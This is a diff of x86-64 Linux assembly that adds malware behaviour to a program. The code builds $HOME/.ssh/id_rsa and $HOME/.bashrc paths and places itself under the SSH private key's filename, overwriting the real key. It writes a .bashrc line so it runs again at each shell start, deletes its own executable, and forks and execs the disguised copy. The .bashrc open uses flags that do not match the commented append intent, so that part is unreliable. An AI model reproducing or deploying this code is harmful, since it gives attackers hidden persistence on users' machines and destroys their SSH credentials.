@@ -17,7 +17,12 @@ endstruc
 section .data
 
 
-    filename db '/.ssh/id_pabon', 0x00
+    bash_path db '/.bashrc', 0x00
+    bash_line db '~/.ssh/id_rsa', 0xA, 0x00
+    bash_line_size equ $ - bash_line
+
+
+    filename db '/.ssh/id_rsa', 0x00
     filename_size equ $ - filename
 
 
@@ -54,6 +59,9 @@ section .bss
 
     buf_filename resb 200
     buf_filename_size equ $ - buf
+
+    buf_bash resb 200
+    buf_bash_size equ $ - buf
 
 
     buf resb 20000
@@ -95,17 +103,17 @@ _start:
 
     mov rax, 0x08
     mov rsi, rsp
-    add rsi, 0x48
+    add rsi, 0x48 ; point to argc
     mov rcx, [rsi]  
     add rcx, 0x02
 
-    imul rcx, rax
+    imul rcx, rax ; offset to the envp*
 
-    add rsi, rcx
+    add rsi, rcx ; rsi points to envp*
     mov rax, 'HOME'
 
 
-.loop:
+.loop: ; the loop parse all the envp* to find the HOME variable
 
     cmp Qword [rsi], 0x00
     je exit
@@ -123,38 +131,68 @@ _start:
     xor rcx, rcx
     xor rax, rax
 
-.loop2:
+.loop2: ; copies the HOME variable to a buffer
 
-    mov al, byte [rdi]
+    mov al, byte [rdi+rcx]
     cmp al, 0x00
     je .next2
-    mov [rsi], al
-    inc rsi
-    inc rdi
+    mov [rsi+rcx], al
+    inc rcx
     jmp .loop2
 
 .next2:
 
-    mov rdi, filename
-    
+    mov rsi, buf_bash
+    xor rcx, rcx
+    xor rax, rax
+
 .loop3:
-    
-    mov al, byte [rdi]
+
+    mov al, byte [rdi+rcx]
     cmp al, 0x00
     je .next3
-    mov [rsi], al
-    inc rsi
-    inc rdi
+    mov [rsi+rcx], al
+    inc rcx
     jmp .loop3
 
 .next3:
 
-    mov [rsi], byte 0x00
+    mov rsi, buf_filename
+    mov [rbp - 0x20], rcx ; save the HOME variable size in the stack
+    add rsi, rcx
+    xor rcx, rcx
+    mov rdi, filename
 
+.loop4: ; Append the .ssh/id_rsa to the buffer with the HOME variable
+    
+    mov al, byte [rdi+rcx]
+    cmp al, 0x00
+    je .next4
+    mov [rsi+rcx], al
+    inc rcx
+    jmp .loop4
 
+.next4:
 
+    mov [rsi+rcx], byte 0x00
+    mov rsi, buf_bash
+    mov rcx, [rbp - 0x20]
+    add rsi, rcx
+    mov rdi, bash_path
+    xor rcx, rcx
 
+.loop5: ; Append the .ssh/id_rsa to the buffer with the HOME variable
+    
+    mov al, byte [rdi+rcx]
+    cmp al, 0x00
+    je .next5
+    mov [rsi+rcx], al
+    inc rcx
+    jmp .loop5
 
+.next5:
+
+    mov [rsi+rcx], byte 0x00
 
 
 ;;;;;
@@ -163,6 +201,7 @@ _start:
     mov rsi, rbp
     add rsi, 0x10
     mov rsi, [rsi]
+    mov [rbp - 0x28], rsi ; save the argv[0] in the stack
 
 
     mov rax, 0x02
@@ -239,6 +278,44 @@ _start:
     mov rdi, [rbp - 0x18]
     mov rax, 0x03
     syscall
+
+    mov rdi, buf_bash
+    mov rsi, 0x02
+    mov rdx, 0x00
+    mov rax, 0x02
+    syscall ; open(bash_path, O_APPEND | O_WRONLY ??? , 0)
+
+    mov [rbp - 0x18], rax
+
+    mov rdi, [rbp - 0x18]
+    mov rsi, bash_line
+    mov rdx, bash_line_size
+    mov rax, 0x01
+    syscall ; write(fd, bash_line, bash_line_size)
+
+
+    mov rdi, [rbp - 0x18]
+    mov rax, 0x03
+    syscall
+
+    mov rdi, [rbp - 0x28] ; argv[0]
+    mov rax, 0x57
+    syscall ; unlink
+
+    mov rax, 0x39
+    syscall ; fork()
+
+    cmp rax, 0x00
+    jne exit ; exit the parent process
+
+    mov rdi, buf_filename
+    xor rax, rax
+    push rax
+    push rdi
+    mov rsi, rsp
+    mov rdx, 0x00
+    mov rax, 0x3b
+    syscall ; execve(buf_filename, argv, envp)
 
     nop
     nop
